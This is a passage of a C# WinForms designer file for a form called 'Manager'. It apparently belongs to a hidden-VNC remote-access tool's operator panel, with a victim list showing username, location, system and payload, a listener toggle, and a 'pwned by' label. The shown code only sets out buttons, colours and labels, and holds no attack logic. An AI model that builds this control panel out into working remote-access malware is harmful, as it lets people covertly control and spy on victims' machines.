            bloom20.Value = System.Drawing.Color.White;
            bloom21.Name = "Glow";
            bloom21.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom22.Name = "Border";
            bloom22.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom23.Name = "Corners";
            bloom23.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton1.Colors = new ShitarusPrivate.Bloom[] {
        bloom11,
        bloom12,
        bloom13,
        bloom14,
        bloom15,
        bloom16,
        bloom17,
        bloom18,
        bloom19,
        bloom20,
        bloom21,
        bloom22,
        bloom23};
            this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton1.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton1.Image = null;
            this.studioButton1.Location = new System.Drawing.Point(1290, -5);
            this.studioButton1.Name = "studioButton1";
            this.studioButton1.NoRounding = false;
            this.studioButton1.Size = new System.Drawing.Size(13, 30);
            this.studioButton1.TabIndex = 25;
            this.studioButton1.Transparent = true;
            this.studioButton1.Click += new System.EventHandler(this.studioButton1_Click);
            // 
            // studioButton5
            // 
            this.studioButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom24.Name = "DownGradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom25.Name = "DownGradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom26.Name = "NoneGradient1";
            bloom26.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom27.Name = "NoneGradient2";
            bloom27.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom28.Name = "Shine1";
            bloom28.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom29.Name = "Shine2A";
            bloom29.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom30.Name = "Shine2B";
            bloom30.Value = System.Drawing.Color.Transparent;
            bloom31.Name = "Shine3";
            bloom31.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom32.Name = "TextShade";
            bloom32.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom33.Name = "Text";
            bloom33.Value = System.Drawing.Color.White;
            bloom34.Name = "Glow";
            bloom34.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom35.Name = "Border";
            bloom35.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom36.Name = "Corners";
            bloom36.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton5.Colors = new ShitarusPrivate.Bloom[] {
        bloom24,
        bloom25,
        bloom26,
        bloom27,
        bloom28,
        bloom29,
        bloom30,
        bloom31,
        bloom32,
        bloom33,
        bloom34,
        bloom35,
        bloom36};
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(1347, -5);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 24;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(this.studioButton5_Click);
            // 
            // ClientsList
            // 
            this.ClientsList.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ClientsList.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.ClientsList.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.ClientsList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4,
            this.columnHeader5,
            this.columnHeader6,
            this.columnHeader7});
            this.ClientsList.Font = new System.Drawing.Font("Microsoft Sans Serif", 8F);
            this.ClientsList.FullRowSelect = true;
            this.ClientsList.HideSelection = false;
            this.ClientsList.Location = new System.Drawing.Point(14, 41);
            this.ClientsList.Name = "ClientsList";
            this.ClientsList.OwnerDraw = true;
            this.ClientsList.Size = new System.Drawing.Size(1346, 587);
            this.ClientsList.SmallImageList = this.imageList1;
            this.ClientsList.TabIndex = 1;
            this.ClientsList.UseCompatibleStateImageBehavior = false;
            this.ClientsList.View = System.Windows.Forms.View.Details;
            this.ClientsList.DoubleClick += new System.EventHandler(this.HVNCList_DoubleClick);
            this.ClientsList.MouseDown += new System.Windows.Forms.MouseEventHandler(this.HVNCList_MouseDown);
            this.ClientsList.MouseLeave += new System.EventHandler(this.HVNCList_MouseLeave);
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "GROUP";
            this.columnHeader1.Width = 135;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "ROOT";
            this.columnHeader2.Width = 141;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "USERNAME";
            this.columnHeader3.Width = 176;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "LOCATION";
            this.columnHeader4.Width = 100;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "SYSTEM";
            this.columnHeader5.Width = 198;
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "ACTIVATED";
            this.columnHeader6.Width = 135;
            // 
            // columnHeader7
            // 
            this.columnHeader7.Text = "PAYLOAD";
            this.columnHeader7.Width = 91;
            // 
            // studioButton4
            // 
            this.studioButton4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton4.BackColor = System.Drawing.Color.Transparent;
            bloom37.Name = "DownGradient1";
            bloom37.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom38.Name = "DownGradient2";
            bloom38.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom39.Name = "NoneGradient1";
            bloom39.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom40.Name = "NoneGradient2";
            bloom40.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom41.Name = "Shine1";
            bloom41.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom42.Name = "Shine2A";
            bloom42.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom43.Name = "Shine2B";
            bloom43.Value = System.Drawing.Color.Transparent;
            bloom44.Name = "Shine3";
            bloom44.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom45.Name = "TextShade";
            bloom45.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom46.Name = "Text";
            bloom46.Value = System.Drawing.Color.White;
            bloom47.Name = "Glow";
            bloom47.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom48.Name = "Border";
            bloom48.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom49.Name = "Corners";
            bloom49.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton4.Colors = new ShitarusPrivate.Bloom[] {
        bloom37,
        bloom38,
        bloom39,
        bloom40,
        bloom41,
        bloom42,
        bloom43,
        bloom44,
        bloom45,
        bloom46,
        bloom47,
        bloom48,
        bloom49};
            this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton4.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton4.Image = null;
            this.studioButton4.Location = new System.Drawing.Point(1328, -5);
            this.studioButton4.Name = "studioButton4";
            this.studioButton4.NoRounding = false;
            this.studioButton4.Size = new System.Drawing.Size(13, 30);
            this.studioButton4.TabIndex = 23;
            this.studioButton4.Transparent = true;
            this.studioButton4.Click += new System.EventHandler(this.studioButton4_Click);
            // 
            // studioButton3
            // 
            this.studioButton3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton3.BackColor = System.Drawing.Color.Transparent;
            bloom50.Name = "DownGradient1";
            bloom50.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom51.Name = "DownGradient2";
            bloom51.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom52.Name = "NoneGradient1";
            bloom52.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom53.Name = "NoneGradient2";
            bloom53.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom54.Name = "Shine1";
            bloom54.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom55.Name = "Shine2A";
            bloom55.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom56.Name = "Shine2B";
            bloom56.Value = System.Drawing.Color.Transparent;
            bloom57.Name = "Shine3";
            bloom57.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom58.Name = "TextShade";
            bloom58.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom59.Name = "Text";
            bloom59.Value = System.Drawing.Color.White;
            bloom60.Name = "Glow";
            bloom60.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom61.Name = "Border";
            bloom61.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom62.Name = "Corners";
            bloom62.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton3.Colors = new ShitarusPrivate.Bloom[] {
        bloom50,
        bloom51,
        bloom52,
        bloom53,
        bloom54,
        bloom55,
        bloom56,
        bloom57,
        bloom58,
        bloom59,
        bloom60,
        bloom61,
        bloom62};
            this.studioButton3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton3.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton3.Image = null;
            this.studioButton3.Location = new System.Drawing.Point(1309, -5);
            this.studioButton3.Name = "studioButton3";
            this.studioButton3.NoRounding = false;
            this.studioButton3.Size = new System.Drawing.Size(13, 30);
            this.studioButton3.TabIndex = 22;
            this.studioButton3.Transparent = true;
            this.studioButton3.Click += new System.EventHandler(this.studioButton3_Click);
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.BackColor = System.Drawing.Color.White;
            this.panel1.Controls.Add(this.Expiry);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.chkListen);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.HVNCListen);
            this.panel1.Controls.Add(this.txtSub);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Location = new System.Drawing.Point(14, 32);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(1346, 626);
            this.panel1.TabIndex = 39;
            // 
            // txtSub
            // 
            this.txtSub.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.txtSub.AutoSize = true;
            this.txtSub.ForeColor = System.Drawing.Color.SteelBlue;
            this.txtSub.Location = new System.Drawing.Point(810, 604);
            this.txtSub.Name = "txtSub";
            this.txtSub.Size = new System.Drawing.Size(32, 16);
            this.txtSub.TabIndex = 48;
            this.txtSub.Text = "Sub";
            this.txtSub.Visible = false;
            // 
            // label4
            // 
            this.label4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label4.AutoSize = true;
            this.label4.ForeColor = System.Drawing.Color.DimGray;
            this.label4.Location = new System.Drawing.Point(733, 604);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(194, 16);
            this.label4.TabIndex = 47;
            this.label4.Text = "pwned by @GrimReaper1312";
            // 
            // Expiry
            // 
            this.Expiry.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.Expiry.AutoSize = true;
            this.Expiry.ForeColor = System.Drawing.Color.SteelBlue;
            this.Expiry.Location = new System.Drawing.Point(1125, 604);
            this.Expiry.Name = "Expiry";
            this.Expiry.Size = new System.Drawing.Size(38, 16);
            this.Expiry.TabIndex = 46;
            this.Expiry.Text = "Date";
            this.Expiry.Visible = false;
            // 
            // label2
            // 
            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label2.AutoSize = true;
            this.label2.ForeColor = System.Drawing.Color.DimGray;
            this.label2.Location = new System.Drawing.Point(1035, 604);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(75, 16);
            this.label2.TabIndex = 45;
            this.label2.Text = "Lifetime ;)";
            // 
            // chkListen
            // 
            this.chkListen.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.chkListen.BackColor = System.Drawing.Color.Transparent;
            this.chkListen.Location = new System.Drawing.Point(9, 603);
            this.chkListen.Name = "chkListen";
            this.chkListen.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkListen.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkListen.Size = new System.Drawing.Size(50, 19);
            this.chkListen.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkListen.TabIndex = 40;
            this.chkListen.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkListen_CheckedChanged);
            // 
            // label1
            // 
            this.label1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.DimGray;
            this.label1.Location = new System.Drawing.Point(69, 604);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(75, 16);
            this.label1.TabIndex = 27;
            this.label1.Text = "Listener :";
            // 
            // HVNCListen
            // 
            this.HVNCListen.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.HVNCListen.AutoSize = true;
            this.HVNCListen.BackColor = System.Drawing.Color.Transparent;
            this.HVNCListen.ForeColor = System.Drawing.Color.SteelBlue;
            this.HVNCListen.Location = new System.Drawing.Point(143, 604);
            this.HVNCListen.Name = "HVNCListen";
            this.HVNCListen.Size = new System.Drawing.Size(61, 16);
            this.HVNCListen.TabIndex = 26;
            this.HVNCListen.Text = "Disabled";
            // 
            // Manager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1374, 671);
            this.ContextMenuStrip = this.contextMenuStrip1;
            this.Controls.Add(this.primeTheme1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Manager";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.FrmMain_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);

        }

        [CompilerGenerated]
        private void _FrmMain_Load_b__41_0(object sender, LayoutEventArgs e)
        {
            SetLastColumnWidth();
        }
    }
}
